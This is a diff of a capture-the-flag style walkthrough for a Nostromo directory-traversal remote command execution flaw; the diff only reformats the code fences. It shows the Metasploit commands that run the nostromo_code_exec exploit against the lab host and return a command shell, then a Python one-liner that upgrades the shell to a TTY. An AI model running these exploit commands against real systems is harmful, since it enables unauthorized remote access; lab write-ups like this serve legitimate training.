@@ -35,9 +35,9 @@ This version contains Directory Traversal Remote Command Execution Vulnerability
 Lets use Metasploit module to exploit this vulnerability.
 Start the PostgreSQL database & the Metasploit using this command:
 
-'''
+```
 msfdb run
-'''
+```
 
 <p align="center">
   <img src="screenshots/5.png" width="738">
@@ -45,12 +45,12 @@ msfdb run
 
 Configure the exploit and run it. It will return a Command Shell.
 
-'''
+```
 use exploit/multi/http/nostromo_code_exec
 set rhosts 10.10.10.165
 set lhost tun0
 run
-'''
+```
 
 <p align="center">
   <img src="screenshots/6.png" width="738">
@@ -58,9 +58,9 @@ run
 
 Use the following Python one-liner to spawn to a TTY shell.
 
-'''
+```
 python -c 'import pty; pty.spawn("/bin/bash")'
-'''
+```
 
 And, we are on the box!
 
